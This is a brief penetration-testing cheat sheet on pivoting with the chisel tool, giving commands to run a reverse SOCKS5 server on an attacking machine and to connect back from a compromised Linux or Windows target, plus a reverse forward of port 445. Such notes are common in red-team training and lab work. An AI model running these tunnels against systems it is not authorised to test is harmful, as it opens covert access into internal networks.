Using SOCKS5

On the attacking machine run:

```bash
sudo ./chisel server -p 8002 --reverse --socks5
```

On target run:

Linux:

```bash
./chisel client <attacker_IP>:8002 R:socks
```

Windows:

```bash
chisel.exe client <attacker_IP>:8002 R:socks
```

Example of port forwarding single port:

```bash
./chisel client <attacker_IP>:8002 R:445:127.0.0.1:445
```
